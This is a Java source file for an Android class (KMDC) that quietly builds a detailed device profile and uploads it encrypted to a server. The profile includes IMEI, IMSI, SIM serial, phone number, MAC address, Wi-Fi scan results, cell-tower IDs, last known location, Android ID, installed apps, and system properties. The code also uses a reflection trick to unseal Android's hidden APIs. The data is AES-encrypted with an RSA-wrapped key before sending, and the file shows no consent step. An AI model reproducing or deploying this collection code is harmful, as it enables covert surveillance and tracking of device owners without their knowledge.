package com.kmdc.mdu;

import static android.content.Context.WIFI_SERVICE;
import static android.os.Build.VERSION.SDK_INT;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.DhcpInfo;
import android.net.NetworkInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.provider.Settings;
import android.telephony.CellInfo;
import android.telephony.CellInfoCdma;
import android.telephony.CellInfoGsm;
import android.telephony.CellInfoLte;
import android.telephony.CellInfoTdscdma;
import android.telephony.CellInfoWcdma;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import com.kmdc.mdu.http.UtilNetworking;
import com.kmdc.mdu.oaid.CoreOaid;
import com.kmdc.mdu.oaid.OAIDHelper;
import com.kmdc.mdu.utils.AESUtils;
import com.kmdc.mdu.utils.CameraUtils;
import com.kmdc.mdu.utils.Crc32Utils;
import com.kmdc.mdu.utils.GpuUtils;
import com.kmdc.mdu.utils.RSAUtils;
import com.kmdc.mdu.utils.Utils;
import com.satori.sdk.io.event.openudid.OpenUDIDClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.lang.ref.WeakReference;
import java.lang.reflect.Method;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.CountDownLatch;

import zizzy.zhao.bridgex.l.L;

/**
 * Created by hw on 19-1-3.
 */

public class KMDC {

    private static Object[] lock = new Object[0];
    private static CountDownLatch latch = new CountDownLatch(1);

    private static class Holder {
        private static volatile KMDC INSTANCE = new KMDC();
    }

    private KMDC() {
    }

    public static KMDC get() {
        return Holder.INSTANCE;
    }

    public static void doFetch(Activity activity) {
        L.attach(activity);
        StringBuilder sb = new StringBuilder()
                .append("\n\t----\t" + Build.BRAND)
                .append("\n\t----\t" + Build.MANUFACTURER)
                .append("\n\t----\t" + Build.DEVICE)
                .append("\n\t----\t" + Build.MODEL);
        L.i("Running on sdk version: " + SDK_INT + sb);

        try {
            if (me.weishu.reflection.Reflection.unseal(activity) != 0) {
                L.e("Oops!!! Failed to unseal on " + SDK_INT);
            } else {
                L.i("Success to unseal on " + SDK_INT);
            }
        } catch (Throwable t) {
            L.e("Oops!!! Failed to unseal on " + SDK_INT);
        }

        final File lockFile = new File(activity.getFilesDir(), ".kmdc_lock");
        if (lockFile != null && lockFile.exists()) {
            L.w("No need to fetch data.");
            return;
        }

        String openudid = OpenUDIDClient.getOpenUDID(activity);

        get().coltMobData(activity, openudid, content -> {
            L.d(content);

//            byte[] base64Char = Base64.encode(content.getBytes(StandardCharsets.UTF_8), 0);
//            File localFile = FileUtils.saveFile(activity, base64Char);
//            L.d(localFile.getAbsolutePath(), null);
//            if (localFile != null && localFile.exists()) {
//                String destFileName = openudid.replaceAll("-", "") + ".zip";
//                File destFile = new File(activity.getFilesDir() + File.separator + destFileName);
//                File zippedFile = GZIPUtils.compress(localFile, destFile);
//                L.d(zippedFile.getAbsolutePath(), null);
//                if (zippedFile != null && zippedFile.exists()) {
//                    if (!localFile.delete()) {
//                        L.w( "Failed to delete file.");
//                    } else {
//                        L.d("Success to delete " + localFile);
//                    }
//                }
//            }

//            String base64Str = Base64.encodeToString(content.getBytes(StandardCharsets.UTF_8), 0);
            new Thread(() -> {
                try {
                    UUID uuid = UUID.randomUUID();
                    String uuidStr = uuid.toString().replaceAll("-", "");
                    uuidStr = uuidStr.substring(0, 16);

                    String cipherText = AESUtils.encrypt(content, uuidStr, uuidStr);

                    String signStr = RSAUtils.encryptByPublicKey(uuidStr, RSAUtils.PUBLIC_KEY_TEST);

                    JSONObject jo = UtilNetworking.doPost(cipherText, openudid, signStr);
                    int status = jo.getInt("status");
                    L.d("jo: " + jo);
                    switch (status) {
                        case 0:
                            break;
                        case 1:
                            if (lockFile != null && !lockFile.exists()) {
                                lockFile.createNewFile();
                            }
                            break;
                        default:
                            throw new IllegalStateException("Invalid status: " + status);
                    }
                } catch (Throwable t) {
                    L.e(t);
                }
            }).start();
        });
    }

    @SuppressLint({"MissingPermission", "WrongConstant"})
    private void coltMobData(Activity context, String openudid, OnFetchListener listener) {
        WeakReference<Activity> wrCtx = new WeakReference<>(context);
        Activity activity = wrCtx.get();

        new Thread(() -> {
            synchronized (lock) {
                L.i("Start to fetch...");

                JSONObject mdJson = new JSONObject();
                try {
                    mdJson.put("openudid", openudid);

                    /* OAID */
                    CoreOaid.readOaid(activity);
                    OAIDHelper.fetchOAID(activity, (params, sdkVersionCode) -> {
                        try {
                            mdJson.put("oaid_sdk_ver_code", sdkVersionCode);
                        } catch (Throwable t) {
                            L.e("Failed to fetch OAID: " + t);
                        }

                        try {
                            mdJson.put("oaid", params.get("oaid"));
                        } catch (Throwable t) {
                            L.e("Failed to fetch OAID: " + t);
                        } finally {
                            latch.countDown();
                        }
                    });
                    latch.await();

                    /* BUILD / BUILD_VERSION */
                    Map<String, Object> retVal = Utils.fetchFieldClass(Build.class);
                    JSONObject jo = new JSONObject(retVal);
                    mdJson.put("build", jo);
                    retVal = Utils.fetchFieldClass(Build.VERSION.class);
                    jo = new JSONObject(retVal);
                    mdJson.put("build_version", jo);

                    mdJson.put("srl", Build.SERIAL);
                    mdJson.put("bsband", getBaseband_Ver());
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.ICE_CREAM_SANDWICH) {
                        mdJson.put("radioVersion", Build.getRadioVersion());
                    } else {
                        mdJson.put("radioVersion", "");
                    }
                    mdJson.put("brd", Build.BOARD);
                    mdJson.put("abi", Build.CPU_ABI);
                    mdJson.put("abi2", Build.CPU_ABI2);
                    mdJson.put("dvc", Build.DEVICE);
                    mdJson.put("dspl", Build.DISPLAY);
                    mdJson.put("fgpf", Build.FINGERPRINT);
                    mdJson.put("hw", Build.HARDWARE);
                    mdJson.put("iid", Build.ID);
                    mdJson.put("mfc", Build.MANUFACTURER);
                    mdJson.put("btld", Build.BOOTLOADER);
                    mdJson.put("host", Build.HOST);
                    mdJson.put("tags", Build.TAGS);
                    mdJson.put("type", Build.TYPE);
                    mdJson.put("icmt", Build.VERSION.INCREMENTAL);
                    mdJson.put("rlse", Build.VERSION.RELEASE);
                    mdJson.put("sdk", Build.VERSION.SDK_INT + "");
                    mdJson.put("ftm", Build.TIME);
                    mdJson.put("desc", getDescription());

                    /* DISPLAY */
                    try {
                        DisplayMetrics displayMetrics = activity.getResources().getDisplayMetrics();
                        mdJson.put("dpi", String.valueOf(displayMetrics.densityDpi));
                        mdJson.put("density", String.valueOf(displayMetrics.density));
                        mdJson.put("xdpi", String.valueOf(displayMetrics.xdpi));
                        mdJson.put("ydpi", String.valueOf(displayMetrics.ydpi));
                        mdJson.put("scldns", String.valueOf(displayMetrics.scaledDensity));
                    } catch (Throwable t) {
                        mdJson.put("dpi", "");
                        mdJson.put("density", "");
                        mdJson.put("xdpi", "");
                        mdJson.put("ydpi", "");
                        mdJson.put("scldns", "");
                    }

//                    mdJson.put("vidmfc", vidmfc);
//                    mdJson.put("vidnm", vidnm);
//                    mdJson.put("lmac", "");

                    //net； 网络类型
                    mdJson.put("net", getNetworkState(activity));

                    int parttype = isUserApp(activity, activity.getPackageName()) ? 2 : 1;
                    mdJson.put("parttype", parttype);

                    TelephonyManager tm = (TelephonyManager) activity.getSystemService(
                            Context.TELEPHONY_SERVICE);
                    try {
                        mdJson.put("simid", tm.getSimSerialNumber());
                    } catch (Throwable t) {
                        mdJson.put("simid", "");
                    }

                    try {
                        mdJson.put("standardimei", tm.getDeviceId());
                    } catch (Throwable t) {
                        mdJson.put("standardimei", "");

                    }

                    try {
                        mdJson.put("phnum", tm.getLine1Number());
                    } catch (Throwable t) {
                        mdJson.put("phnum", "");
                    }

                    try {
                        mdJson.put("imsi", tm.getSubscriberId());
                    } catch (Throwable t) {
                        mdJson.put("imsi", "");
                    }

                    try {
                        mdJson.put("networktype", tm.getNetworkType());
                    } catch (Throwable t) {
                        mdJson.put("networktype", -111);
                    }

                    try {
                        mdJson.put("operator_numeric", tm.getSimOperator());
                    } catch (Throwable t) {
                        mdJson.put("operator_numeric", "");
                    }

                    try {
                        mdJson.put("netcd", tm.getNetworkOperator());
                    } catch (Throwable t) {
                        mdJson.put("netcd", "");
                    }

                    try {
                        mdJson.put("netnm", tm.getNetworkOperatorName());
                    } catch (Throwable t) {
                        mdJson.put("netnm", "");
                    }

                    try {
                        mdJson.put("iso", tm.getNetworkCountryIso());
                    } catch (Throwable t) {
                        mdJson.put("iso", "");
                    }

                    try {
                        mdJson.put("simty", tm.getSimState());
                    } catch (Throwable t) {
                        mdJson.put("simty", -111);
                    }

                    try {
                        mdJson.put("phoneType", tm.getPhoneType());
                    } catch (Throwable t) {
                        mdJson.put("phoneType", TelephonyManager.PHONE_TYPE_NONE);
                    }

                    double latitude = -111;
                    double longitude = -111;
                    try {
                        LocationManager locationManager = (LocationManager) activity.getSystemService(
                                Context.LOCATION_SERVICE);
                        String prv = LocationManager.NETWORK_PROVIDER;
                        Location location = locationManager.getLastKnownLocation(prv);
                        if (location != null) {
                            latitude = location.getLongitude();
                            longitude = location.getLatitude();
                        } else {
                            location = locationManager.getLastKnownLocation(
                                    LocationManager.PASSIVE_PROVIDER);
                            if (location != null) {
                                latitude = location.getLongitude();
                                longitude = location.getLatitude();
                            }
                        }
                    } catch (Throwable t) {
                    }

                    mdJson.put("lat", latitude);
                    mdJson.put("lon", longitude);

                    WifiManager wm = (WifiManager) activity.getApplicationContext()
                            .getSystemService(WIFI_SERVICE);
                    try {
                        WifiInfo ni = wm.getConnectionInfo();
                        mdJson.put("wi", ni.toString());
                        mdJson.put("mac", ni.getMacAddress());
                        mdJson.put("ssid", ni.getSSID());
                    } catch (Throwable t) {
                        mdJson.put("wi", "");
                        mdJson.put("mac", "");
                        mdJson.put("ssid", "");
                    }

                    try {
                        DhcpInfo dhcpInfo = wm.getDhcpInfo();
                        mdJson.put("dns1", intToIp(dhcpInfo.dns1));
                        mdJson.put("dns2", intToIp(dhcpInfo.dns2));
                        mdJson.put("gateway", intToIp(dhcpInfo.gateway));
                        mdJson.put("ip", intToIp(dhcpInfo.ipAddress));
                        try {
                            Class<?> c = Class.forName("android.os.SystemProperties");
                            Method get = c.getMethod("get", String.class, String.class);
                            String hostname = (String) get.invoke(c, "net.hostname", "Error");
                            mdJson.put("net_hostname", hostname);
                        } catch (Throwable t) {
                            mdJson.put("net_hostname", "");
                        }
                    } catch (Throwable t) {
                        mdJson.put("dns1", -111);
                        mdJson.put("dns2", -111);
                        mdJson.put("gateway", -111);
                        mdJson.put("ip", -111);
                        mdJson.put("net_hostname", "");
                    }

                    //附近
                    try {
                        List<ScanResult> list = wm.getScanResults();
                        JSONArray wfsrJa = new JSONArray();
                        if (list != null && list.size() > 0) {
                            for (ScanResult s : list) {
                                JSONObject scJa = new JSONObject();
                                scJa.put("sr_bssid", s.toString());
                                scJa.put("connected", true);
                                wfsrJa.put(scJa);
                            }
                        }
                        mdJson.put("sr_wifi", wfsrJa);
                    } catch (Throwable t) {
                    }

                    try {
                        String operator = tm.getNetworkOperator();
                        int mcc = Integer.parseInt(operator.substring(0, 3));
                        int mnc = Integer.parseInt(operator.substring(3));
                        mdJson.put("mcc", mcc);
                        mdJson.put("mnc", mnc);
                    } catch (Throwable t) {
                        mdJson.put("mcc", -111);
                        mdJson.put("mnc", -111);
                    }

                    try {
                        CellLocation location = tm.getCellLocation();
                        if (location instanceof GsmCellLocation) {
                            GsmCellLocation gsmlocation = (GsmCellLocation) location;
                            mdJson.put("lac", gsmlocation.getLac());
                            mdJson.put("cellId", gsmlocation.getCid());
                        } else if (location instanceof CdmaCellLocation) {
                            CdmaCellLocation cdmalocation = (CdmaCellLocation) location;
                            mdJson.put("nid", cdmalocation.getNetworkId());
                            mdJson.put("sid", cdmalocation.getSystemId());
                            mdJson.put("bid", cdmalocation.getBaseStationId());
                        }
                    } catch (Throwable t) {
                        mdJson.put("lac", -111);
                        mdJson.put("cellId", -111);
                        mdJson.put("nid", -111);
                        mdJson.put("sid", -111);
                        mdJson.put("bid", -111);
                    }

                    // 获取邻区基站信息
                    try {
                        List<CellInfo> cellInfoList = tm.getAllCellInfo();
                        if (cellInfoList != null && cellInfoList.size() > 0) {
                            JSONArray bciJa = new JSONArray();
                            for (CellInfo info : cellInfoList) {
                                JSONObject bciJs = new JSONObject();
                                bciJs.put("LAC", neighboringCellInfoGetLac(info));
                                bciJs.put("CID", neighboringCellInfoGetCid(info));
                                bciJs.put("BSSS",
                                        -113 + 2 * neighboringCellInfoGetRssi(info));
                                bciJa.put(bciJs);
                            }
                            mdJson.put("bsngb", bciJa);
                        }
                    } catch (Throwable t) {
                        L.e("Failed to get all cellinfo: " + t);
                    }

                    try {
                        String androidid = Settings.Secure.getString(activity.getContentResolver(),
                                Settings.Secure.ANDROID_ID);
                        mdJson.put("androidid", androidid);
                    } catch (Throwable t) {
                        mdJson.put("androidid", "");
                    }

                    WindowManager winMgr = (WindowManager) activity.getSystemService(Context.WINDOW_SERVICE);
                    int width = winMgr.getDefaultDisplay().getWidth();
                    int ht = winMgr.getDefaultDisplay().getHeight();
                    mdJson.put("ht", ht);
                    mdJson.put("wdth", width);

                    String erommax = "";
                    String eromuse = "";
                    String state = Environment.getExternalStorageState();
                    if (Environment.MEDIA_MOUNTED.equals(state)) {
                        File sdcardDir = Environment.getExternalStorageDirectory();
                        StatFs sf = new StatFs(sdcardDir.getPath());
                        long blockSize = sf.getBlockSize();
                        long blockCount = sf.getBlockCount();
                        long availCount = sf.getAvailableBlocks();
                        erommax = blockSize * blockCount / 1024 + "KB";
                        eromuse = availCount * blockSize / 1024 + "KB";
                    }
                    mdJson.put("erommax", erommax);
                    mdJson.put("eromuse", eromuse);

                    File root = Environment.getRootDirectory();
                    StatFs sf = new StatFs(root.getPath());
                    long blockSize = sf.getBlockSize();
                    long blockCount = sf.getBlockCount();
                    long availCount = sf.getAvailableBlocks();
                    mdJson.put("irommax", blockSize * blockCount / 1024 + "KB");
                    mdJson.put("iromuse", availCount * blockSize / 1024 + "KB");
                    mdJson.put("applist", getUserApp(activity));

                    try {
                        mdJson.put("cpuif", getCpuInfo());
                    } catch (Throwable t) {
                    }

                    try {
                        mdJson.put("memif", getMemInfo());
                    } catch (Throwable t) {
                    }

                    try {
                        mdJson.put("getprop", doGetprop());
                    } catch (Throwable t) {
                    }

                    try {
                        SensorManager sensorManager = (SensorManager) activity.getSystemService(
                                Context.SENSOR_SERVICE);
                        List<Sensor> sensors = sensorManager.getSensorList(Sensor.TYPE_ALL);
                        if (sensors != null && sensors.size() > 0) {
                            JSONArray senJa = new JSONArray();
                            for (Sensor sensor : sensors) {
                                senJa.put(sensor.toString());
                            }
                            mdJson.put("sens", senJa);
                        }
                    } catch (Throwable t) {
                        L.e("Failed to get sensor list: " + t);
                    }

                    mdJson.put("camera", CameraUtils.getCameraCharacteristics(activity));

                    activity.runOnUiThread(() -> {
                        try {
                            mdJson.put("gpu", GpuUtils.getGLParams());
                        } catch (Throwable t) {
                            L.e("Failed to get gl params: " + t);
                        } finally {
                            latch.countDown();
                        }

                        if (listener != null) {
                            listener.onResult(mdJson.toString());
                        }
                    });
                    latch.await();

                    L.i("Fetch finished.");
                } catch (Throwable t) {
                    L.e("Failed to fetch: ", t);
                }
            }
        }).start();
    }

    private String intToIp(int paramInt) {
        return (paramInt & 0xFF) + "." + (0xFF & paramInt >> 8) + "." + (0xFF & paramInt >> 16) + "."
                + (0xFF & paramInt >> 24);
    }

    private JSONArray getUserApp(Context activity) {
        JSONArray jsonArray = new JSONArray();
        try {
            PackageManager pm = activity.getPackageManager();
            // Return a List of all packages that are installed on the device.
            List<PackageInfo> packages = pm.getInstalledPackages(0);

            for (PackageInfo packageInfo : packages) {
                // 判断系统/非系统应用
                if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) // 非系统应用
                {
                    JSONObject jsonObject = new JSONObject();
                    try {
                        jsonObject.put("pkg", packageInfo.packageName);
                        jsonObject.put("vernm", packageInfo.versionName);
                        jsonObject.put("vercd", packageInfo.versionCode);
                        jsonObject.put("crc", Crc32Utils.crc(activity, packageInfo.packageName));
                        jsonArray.put(jsonObject);
                    } catch (JSONException e) {
                    }
                }
            }
        } catch (Throwable t) {
        }

        return jsonArray;
    }

    //基带版本号
    private String getBaseband_Ver() {
        String Version = "";
        try {
            Class cl = Class.forName("android.os.SystemProperties");
//            Object invoker = cl.newInstance();
            Method m = cl.getMethod("get", new Class[]{String.class, String.class});
            Object result = m.invoke(cl, new Object[]{"gsm.version.baseband", "no message"});
            Version = (String) result;
        } catch (Throwable t) {
        }
        return Version;
    }

    private String getDescription() {
        String desc = "";
        try {
            Class cl = Class.forName("android.os.SystemProperties");
//            Object invoker = cl.newInstance();
            Method m = cl.getMethod("get", new Class[]{String.class, String.class});
            Object result = m.invoke(cl, "ro.build.description");
            desc = (String) result;
        } catch (Throwable t) {
        }
        return desc;
    }

    @SuppressLint("MissingPermission")
    private String getNetworkState(Context activity) {
        try {
            ConnectivityManager connMgr = (ConnectivityManager) activity.getSystemService(
                    Context.CONNECTIVITY_SERVICE);
            if (null == connMgr) {
                return "no network";
            }

            NetworkInfo ni = connMgr.getActiveNetworkInfo();
            if (ni == null || !ni.isAvailable()) {
                return "no network";
            }

            ni = connMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
            if (null != ni) {
                NetworkInfo.State state = ni.getState();
                if (null != state)
                    if (state == NetworkInfo.State.CONNECTED
                            || state == NetworkInfo.State.CONNECTING) {
                        return "WIFI";
                    }
            }

            ni = connMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            if (null != ni) {
                NetworkInfo.State state = ni.getState();
                String strSubTypeName = ni.getSubtypeName();
                if (null != state)
                    if (state == NetworkInfo.State.CONNECTED
                            || state == NetworkInfo.State.CONNECTING) {
                        switch (ni.getSubtype()) {
                            case TelephonyManager.NETWORK_TYPE_GPRS: // 联通2g
                            case TelephonyManager.NETWORK_TYPE_CDMA: // 电信2g
                            case TelephonyManager.NETWORK_TYPE_EDGE: // 移动2g
                            case TelephonyManager.NETWORK_TYPE_1xRTT:
                            case TelephonyManager.NETWORK_TYPE_IDEN:
                                return "2G";
                            case TelephonyManager.NETWORK_TYPE_EVDO_A: // 电信3g
                            case TelephonyManager.NETWORK_TYPE_UMTS:
                            case TelephonyManager.NETWORK_TYPE_EVDO_0:
                            case TelephonyManager.NETWORK_TYPE_HSDPA:
                            case TelephonyManager.NETWORK_TYPE_HSUPA:
                            case TelephonyManager.NETWORK_TYPE_HSPA:
                            case TelephonyManager.NETWORK_TYPE_EVDO_B:
                            case TelephonyManager.NETWORK_TYPE_EHRPD:
                            case TelephonyManager.NETWORK_TYPE_HSPAP:
                                return "3G";
                            case TelephonyManager.NETWORK_TYPE_LTE:
                                return "4G";
                            default:
                                if (strSubTypeName.equalsIgnoreCase("TD-SCDMA")
                                        || strSubTypeName.equalsIgnoreCase("WCDMA")
                                        || strSubTypeName.equalsIgnoreCase("CDMA2000")) {
                                    return "3G";
                                } else {
                                    return "G";
                                }
                        }
                    }
            }
        } catch (Throwable t) {
        }
        return "no network";
    }

    private boolean isUserApp(Context activity, String pkg) {
        try {
            PackageInfo mPackageInfo = activity.getPackageManager().getPackageInfo(pkg, 0);
            return (mPackageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) <= 0;
        } catch (PackageManager.NameNotFoundException e) {
        }
        return false;
    }

    private String doGetprop() {
        Utils.CmdResult cr = Utils.doCommands("getprop");
        if (!TextUtils.isEmpty(cr.result)) {
            return cr.result;
        }
        return "";
    }

    private String getCpuInfo() {
        FileReader fr = null;
        BufferedReader br = null;
        String line = null;
        StringBuilder sb = new StringBuilder();
        try {
            fr = new FileReader("/proc/cpuinfo");
            br = new BufferedReader(fr);
            line = br.readLine();
            sb.append(line);
            while (line != null) {
                line = br.readLine();
                sb.append("\r\n");
                sb.append(line);
            }
            return sb.toString();
        } catch (Throwable t) {
            L.e("Failed to get cpuinfo: " + t);
        } finally {
            if (fr != null) {
                try {
                    fr.close();
                } catch (IOException e) {
                }
            }

            if (br != null) {
                try {
                    br.close();
                } catch (IOException e) {
                }
            }
        }
        return "";
    }

    private String getMemInfo() {
        FileReader fr = null;
        BufferedReader br = null;
        String line = null;
        StringBuilder sb = new StringBuilder();
        try {
            fr = new FileReader("/proc/meminfo");
            br = new BufferedReader(fr);
            line = br.readLine();
            sb.append(line);
            while (line != null) {
                line = br.readLine();
                sb.append("\r\n");
                sb.append(line);
            }
            return sb.toString();
        } catch (Throwable t) {
            L.e("Failed to get meminfo: " + t);
        } finally {
            if (fr != null) {
                try {
                    fr.close();
                } catch (IOException e) {
                }
            }

            if (br != null) {
                try {
                    br.close();
                } catch (IOException e) {
                }
            }
        }
        return "";
    }

    private int neighboringCellInfoGetLac(CellInfo cellInfo) {
        int lac = 0;
        try {
            if (cellInfo instanceof CellInfoGsm) {
                CellInfoGsm cellInfoGsm = (CellInfoGsm) cellInfo;
                lac = cellInfoGsm.getCellIdentity().getLac();
            } else if (cellInfo instanceof CellInfoLte) {
                CellInfoLte cellInfoLte = (CellInfoLte) cellInfo;
                lac = cellInfoLte.getCellIdentity().getTac();
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2
                    && cellInfo instanceof CellInfoWcdma) {
                CellInfoWcdma cellInfoLte = (CellInfoWcdma) cellInfo;
                lac = cellInfoLte.getCellIdentity().getLac();
            } else if (cellInfo instanceof CellInfoCdma) {
                CellInfoCdma cellInfoCdma = (CellInfoCdma) cellInfo;
                lac = cellInfoCdma.getCellIdentity().getNetworkId();
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
                    && cellInfo instanceof CellInfoTdscdma) {
                CellInfoTdscdma cellInfoTdscdma = (CellInfoTdscdma) cellInfo;
                lac = cellInfoTdscdma.getCellIdentity().getLac();
            }
        } catch (Throwable t) {
            L.e("Failed to get neighboring cellinfo lac: " + t);
        }

        return lac;
    }

    private int neighboringCellInfoGetCid(CellInfo cellInfo) {
        int cid = 0;
        try {
            if (cellInfo instanceof CellInfoGsm) {
                CellInfoGsm cellInfoGsm = (CellInfoGsm) cellInfo;
                cid = cellInfoGsm.getCellIdentity().getCid();
            } else if (cellInfo instanceof CellInfoLte) {
                CellInfoLte cellInfoLte = (CellInfoLte) cellInfo;
                cid = cellInfoLte.getCellIdentity().getCi();
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2
                    && cellInfo instanceof CellInfoWcdma) {
                CellInfoWcdma cellInfoLte = (CellInfoWcdma) cellInfo;
                cid = cellInfoLte.getCellIdentity().getCid();
            } else if (cellInfo instanceof CellInfoCdma) {
                CellInfoCdma cellInfoCdma = (CellInfoCdma) cellInfo;
                cid = cellInfoCdma.getCellIdentity().getBasestationId();
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
                    && cellInfo instanceof CellInfoTdscdma) {
                CellInfoTdscdma cellInfoTdscdma = (CellInfoTdscdma) cellInfo;
                cid = cellInfoTdscdma.getCellIdentity().getCid();
            }
        } catch (Throwable t) {
            L.e("Failed to get neighboring cellinfo cid: " + t);
        }

        return cid;
    }

    private int neighboringCellInfoGetRssi(CellInfo cellInfo) {
        int rssi = 0;
        try {
            if (cellInfo instanceof CellInfoGsm) {
                CellInfoGsm cellInfoGsm = (CellInfoGsm) cellInfo;
                rssi = cellInfoGsm.getCellSignalStrength().getDbm();
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
                    && cellInfo instanceof CellInfoLte) {
                CellInfoLte cellInfoLte = (CellInfoLte) cellInfo;
                rssi = cellInfoLte.getCellSignalStrength().getRssi();
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2
                    && cellInfo instanceof CellInfoWcdma) {
                CellInfoWcdma cellInfoLte = (CellInfoWcdma) cellInfo;
                rssi = cellInfoLte.getCellSignalStrength().getDbm();
            } else if (cellInfo instanceof CellInfoCdma) {
                CellInfoCdma cellInfoCdma = (CellInfoCdma) cellInfo;
                rssi = cellInfoCdma.getCellSignalStrength().getDbm();
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
                    && cellInfo instanceof CellInfoTdscdma) {
                CellInfoTdscdma cellInfoTdscdma = (CellInfoTdscdma) cellInfo;
                rssi = cellInfoTdscdma.getCellSignalStrength().getDbm();
            }
        } catch (Throwable t) {
            L.e("Failed to get neighboring cellinfo rssi: " + t);
        }

        return rssi;
    }

    private interface OnFetchListener {
        void onResult(String content);
    }
}
